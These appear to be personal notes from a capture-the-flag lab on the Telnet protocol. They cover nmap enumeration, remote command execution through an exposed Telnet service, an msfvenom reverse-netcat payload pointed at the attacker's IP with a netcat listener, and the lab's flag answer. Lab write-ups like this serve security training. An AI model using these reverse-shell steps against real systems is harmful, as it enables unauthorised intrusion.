 Telnet 
---Notes---
- Telnet is an application protocol which enables with the use of a telnet client to connect to and excute commands on a remote machine thats hosting a telnet server
- Its a low access controlled protocol which can allow attackers to connect to and create a backdoor and to create 
 a  reverse shell to execute remote command.
- The client becomes a virtual terminal allowing you to interact with the remote host
- unencrypted so it sends data in plain text.
- But telnet has beem replaced by ssh which is ecnrypted and more secure.

telnet syntax 
---telnet [ip] [port]

using nmap to scan for open  ports 
sytax
- nmap -A -p- [ip]
-p- --- scans for all the open ports

results of enumeration
-name -  ---- skiddy
-open ports - --- 8012/tcp

exploitation
steps
1. Connected to the telnets server
telnet 10.10.15.104 8012
.HELP to view available commands

2. Check if the machine can execute any command
 --- create a tcpdump listener on another terminal
--- sudo tcpdump ip proto  \\icmp -i tun0

3. Ping using the through the telnet terminal
.RUN ping ip[my local tun0 ip] -c 1
.RUN ping ip[10.18.14.44]

4. Set up a payload uing msfvenom
msfvenom -p cmd/unix/reverse_netcat lhost=[10.18.14.44] lport=4444 R
-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format.

5. set up a port listener
nc -lvp 4444

6. Gaining Access 
ls
flag.txt
cat flag.txt
THM{y0u_g0t_th3_t3ln3t_fl4g}
